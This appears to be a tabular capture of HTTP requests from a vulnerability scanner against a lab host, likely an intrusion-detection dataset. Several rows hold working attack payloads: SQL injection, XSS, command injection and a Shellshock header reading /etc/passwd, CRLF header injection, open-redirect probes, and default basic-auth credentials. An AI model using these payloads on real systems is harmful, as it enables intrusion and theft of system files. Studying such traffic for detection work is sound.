http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/login?LD_DEBUG=files		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/cgi-bin/login?LD_DEBUG=files
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
*/*	gzip	en															close		104	104	application/json						192.168.1.104															1	http://192.168.1.104/web/auth/check		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/auth/check
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C
																											[::1]' UNION SELECT '/															1	http://[::1]' UNION SELECT '//web/etc/passwd		GET				HTTP/1.1																							/web/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/openam/ui/PWResetUserValidation		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/openam/ui/PWResetUserValidation
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip	de,en-US;q=0.7,en;q=0.3	maint:password						Basic bWFpbnQ6cGFzc3dvcmQ=		max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/maint/modules/home/index.php?lang=english|cat%20/etc/passwd
*/*	gzip	en															close		49	49	application/json						192.168.1.104															1	http://192.168.1.104/web/auth/requestreset		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/auth/requestreset
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lab.html?vpath=//example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/lab.html?vpath=//example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0
	gzip																close		27	27	text/plain						192.168.1.104															1	http://192.168.1.104/web/testing-put.txt		PUT				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/testing-put.txt
	gzip		guest:guest						Basic Z3Vlc3Q6Z3Vlc3Q=								close		30	30							192.168.1.104														http://192.168.1.104/web/tools.cgi	1	http://192.168.1.104/web/tools.cgi		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/tools.cgi
*/*	gzip, deflate																close		160	160	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/javax.faces.resource/dynamiccontent.properties.xhtml		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/javax.faces.resource/dynamiccontent.properties.xhtml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==
*/*	gzip	en															close		50	50	application/json						192.168.1.104															1	http://192.168.1.104/web/auth/newpassword		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/auth/newpassword
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/slogin/login.py		GET				HTTP/1.1																			() { :; }; echo ; echo ; /bin/cat /etc/passwd				/web/cgi-bin/slogin/login.py
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%5cgoogle.com/evil.html		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/%5cgoogle.com/evil.html
